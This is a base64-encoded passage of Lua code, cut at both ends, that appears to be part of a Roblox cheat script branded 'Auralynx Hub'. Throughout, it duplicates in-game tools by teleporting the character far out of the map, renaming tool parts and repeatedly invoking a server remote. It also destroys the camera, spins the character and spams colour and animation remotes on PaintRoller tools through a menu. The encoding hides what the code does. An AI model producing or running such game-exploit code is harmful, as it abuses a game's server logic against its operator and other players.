pCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgZW5kCiAgICAKICAgIHdhaXQoMC4xKQogICAgCiAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICBlbmQKICAgIAogICAgZm9yIG0gPSAxLCAyIGRvCiAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICBlbmQKICAgIAogICAgdGFzay53YWl0KDAuMikKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgIHdhaXQoMC41KQogICAgCiAgICBmb3IgYWlkaiwgYWZoIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIG5vdCBhZmguTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICBpZiBhZmg6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgYWllZmhpZXdod2YsIGR2amJ2aiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGR2amJ2ajpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGlmIG5vdCBkdmpidmouTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgZHZqYnZqOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgdHRqdGp1dGp1dGpqdGosIGRkdmR2ZHN2ZGZicm55dHl0bXZkdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHY6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICBpZiBub3QgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2Lm5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGRkdmR2ZHN2ZGZicm55dHl0bXZkdjpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGZpbmRpbiwgdG9vbGxlbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGVsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxlbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgYmFzYywgYWlqZncgaW4gcGFpcnModG9vbGxlbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gIkhhbmRsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBhaWpmdy5OYW1lID0gIkjDosKlYcOiwqVuw6LCpWTDosKlbMOiwqVlIgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgZmlpZmksIHRvb2xsbGwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGxsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBuYW5hLCBqanNqc2ogaW4gcGFpcnModG9vbGxsbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9ICJIw6LCpWHDosKlbsOiwqVkw6LCpWzDosKlZSIKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGZmZWwgPSB0b29sbGxsCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBpZiB0b29sbGxsZm91biA9PSB0cnVlIHRoZW4KICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICByZXBlYXQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICBlbmQKICAgIAogICAgaWYgdG9vbGxsbGZvdW4yID09IHRydWUgdGhlbgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIHdhaXQoKQogICAgICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCiAgICBlbmQKICAgIAogICAgd2FpdCgwLjEpCiAgICAKICAgIGZvciBtID0gMSwgZHVwZWFtb3QgZG8KICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIG0gPD0gZHVwZWFtb3QgdGhlbgogICAgICAgIGVsc2VpZiBtID09IGR1cGVhbW90IG9yIG0gPj0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICBlbmQKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgWzJdID0gdG9vbHNlbGVjdGVkCiAgICAgICAgfQogICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2xzZWxlY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIHdhaXQoKQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sc2VsZWN0ZWRdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDosKlYcOiwqVuw6LCpWTDosKlbMOiwqVlIgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkF1cmFseW54IEh1YiIsCiAgICAgICAgICAgIFRleHQgPSAiVG9vbChzKSBkdXBlZDogIiAuLiBtIC4uICIgLyAiIC4uIGR1cGVhbW90LAogICAgICAgICAgICBEdXJhdGlvbiA9IDEKICAgICAgICB9KQogICAgICAgIHJlcGVhdAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkgPT0gbmlsCiAgICBlbmQKICAgIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgIHJlcGVhdAogICAgICAgIHdhaXQoKQogICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgcmVwZWF0CiAgICAgICAgd2FpdCgpCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgCiAgICBmb3IgeiwgeCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB4Lk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICB3YWl0KCkKICAgIGR1cGluZyA9IGZhbHNlCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgaWYgdG9vbDpJc0Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHdhcm4oIlRvb2wiLCB0b29sLk5hbWUsICJpcyBub3QgaW4gY2hhcmFjdGVyIikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgd2FpdCgxKQogICAgCiAgICBmdW5jdGlvbiBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgICAgIAogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gY2hhbmdlQW5pbWF0aW9uKHRvb2wpICAKICAgICAgICAgICAgaWYgdG9vbDpGaW5kRmlyc3RDaGlsZCgiQ3ljbGVOZXh0QW5pbWF0aW9uIikgdGhlbiAgCiAgICAgICAgICAgICAgICB0b29sLkN5Y2xlTmV4dEFuaW1hdGlvbjpGaXJlU2VydmVyKCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhwbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8gIAogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuICAKICAgICAgICAgICAgICAgIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvICAKICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgZW5kCiAgICAKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICB3YWl0KDEpCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgd2FpdCgxKQogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIAogICAgZnVuY3Rpb24gc3RhcnRTcGluKCkKICAgICAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKICAgICAgICBsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICB0YXNrLndhaXQoMSkgIAogICAgICAgIAogICAgICAgIGxvY2FsIHNwaW5TcGVlZCA9IG1hdGgucmFkKDE3NTApIAogIAogICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKGR0KSAgCiAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHJvb3RQYXJ0LkNGcmFtZSAqIENGcmFtZS5BbmdsZXMoMCwgc3BpblNwZWVkICogZHQsIDApICAKICAgICAgICBlbmQpCiAgICAKICAgIAogICAgZW5kCiAgICAKICAgIHN0YXJ0U3BpbigpIGVuZAplbmQKfSkKLS0gVmFyaWFibGUgdG8gc3RvcmUgdGhlIHNlbGVjdGVkIGNvbG9yCmxvY2FsIHNlbGVjdGVkQ29sb3IgPSBjb2xvcnNUYWJsZVsxXS5Db2xvcgoKLS0gRnVuY3Rpb24gdG8gYXBwbHkgdGhlIHNlbGVjdGVkIGNvbG9yCmxvY2FsIGZ1bmN0aW9uIGFwcGx5U2VsZWN0ZWRDb2xvcigpCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBsb2NhbCBiYWNrcGFjayA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIGFyZ3MgPSB7c2VsZWN0ZWRDb2xvcn0KCiAgICBsb2NhbCBmdW5jdGlvbiBjaGFuZ2VUb29sQ29sb3IodG9vbCkKICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIFNldENvbG9yID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiU2V0Q29sb3IiLCB0cnVlKQogICAgICAgICAgICBpZiBTZXRDb2xvciB0aGVuCiAgICAgICAgICAgICAgICBTZXRDb2xvcjpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCkKICAgIGVuZAogICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sKQogICAgZW5kCmVuZAoKLS0gRnVuY3Rpb24gdG8gZXF1aXAgYW5kIHVuZXF1aXAgdG9vbHMKbG9jYWwgZnVuY3Rpb24gZXF1aXBBbmRVbmVxdWlwVG9vbHMoY2FsbGJhY2spCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBsb2NhbCBiYWNrcGFjayA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCiAgICBsb2NhbCBmdW5jdGlvbiB1bmVxdWlwVG9vbHMoKQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBiYWNrcGFjawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGVxdWlwVG9vbHMoKQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHVuZXF1aXBUb29scygpCiAgICB3YWl0KDAuNykKICAgIGlmIGNhbGxiYWNrIHRoZW4gY2FsbGJhY2soKSBlbmQKICAgIHdhaXQoMC43KQogICAgZXF1aXBUb29scygpCmVuZAoKLS0gRHJvcGRvd24gdG8gc2VsZWN0IHRoZSBjb2xvcgpUb29sc1RhYjpBZGREcm9wZG93bih7CiAgICBOYW1lID0gIkNob29zZSBjb2xvcjoiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sUNob29zZSBhIGNvbG9yIHRvIGFwcGx5LiIsCiAgICBPcHRpb25zID0gKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjb2xvck5hbWVzID0ge30KICAgICAgICBmb3IgXywgY29sb3IgaW4gaXBhaXJzKGNvbG9yc1RhYmxlKSBkbwogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29sb3JOYW1lcywgY29sb3IuTmFtZSkKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gY29sb3JOYW1lcwogICAgZW5kKSgpLAogICAgRGVmYXVsdCA9IGNvbG9yc1RhYmxlWzFdLk5hbWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIGZvciBfLCBjb2xvciBpbiBpcGFpcnMoY29sb3JzVGFibGUpIGRvCiAgICAgICAgICAgIGlmIGNvbG9yLk5hbWUgPT0gc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgc2VsZWN0ZWRDb2xvciA9IGNvbG9yLkNvbG9yCiAgICAgICAgICAgICAgICBlcXVpcEFuZFVuZXF1aXBUb29scyhhcHBseVNlbGVjdGVkQ29sb3IpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRnVuY3Rpb24gdG8gYXBwbHkgUkdCIGN5Y2xlCmxvY2FsIGZ1bmN0aW9uIGFwcGx5UkdCQ3ljbGUoKQogICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgYmFja3BhY2sgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCB0b29sSW5kZXggPSAwCiAgICBsb2NhbCB0b3RhbENvbG9ycyA9ICNjb2xvcnNUYWJsZQoKICAgIGxvY2FsIGZ1bmN0aW9uIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIFNldENvbG9yID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiU2V0Q29sb3IiLCB0cnVlKQogICAgICAgICAgICBpZiBTZXRDb2xvciB0aGVuCiAgICAgICAgICAgICAgICBTZXRDb2xvcjpGaXJlU2VydmVyKGNvbG9yKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgdG9vbEluZGV4ID0gdG9vbEluZGV4ICsgMQogICAgICAgICAgICBsb2NhbCBjb2xvciA9IGNvbG9yc1RhYmxlWyh0b29sSW5kZXggLSAxKSAlIHRvdGFsQ29sb3JzICsgMV0uQ29sb3IKICAgICAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgIGVuZAogICAgZW5kCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICB0b29sSW5kZXggPSB0b29sSW5kZXggKyAxCiAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gY29sb3JzVGFibGVbKHRvb2xJbmRleCAtIDEpICUgdG90YWxDb2xvcnMgKyAxXS5Db2xvcgogICAgICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCwgY29sb3IpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBCdXR0b24gdG8gYXBwbHkgY29sb3IgY3ljbGUKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUmFpbmJvdyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBlcXVpcEFuZFVuZXF1aXBUb29scyhhcHBseVJHQkN5Y2xlKQogICAgZW5kCn0pCgotLSBDb2xvciBjb21iaW5hdGlvbnMKbG9jYWwgY29sb3JDb21iaW5hdGlvbnMgPSB7fQpmb3IgaSwgY29sb3IxIGluIGlwYWlycyhjb2xvcnNUYWJsZSkgZG8KICAgIGZvciBqLCBjb2xvcjIgaW4gaXBhaXJzKGNvbG9yc1RhYmxlKSBkbwogICAgICAgIGlmIGkgfj0gaiB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydChjb2xvckNvbWJpbmF0aW9ucywge05hbWUgPSBjb2xvcjEuTmFtZSAuLiAiIGFuZCAiIC4uIGNvbG9yMi5OYW1lLCBDb2xvcnMgPSB7Y29sb3IxLkNvbG9yLCBjb2xvcjIuQ29sb3J9fSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCi0tIERyb3Bkb3duIGZvciBjb2xvciBjb21iaW5hdGlvbnMKVG9vbHNUYWI6QWRkRHJvcGRvd24oewogICAgTmFtZSA9ICJDaG9vc2UgY29sb3IgY29tYmluYXRpb246IiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFDaG9vc2UgYSBjb2xvciB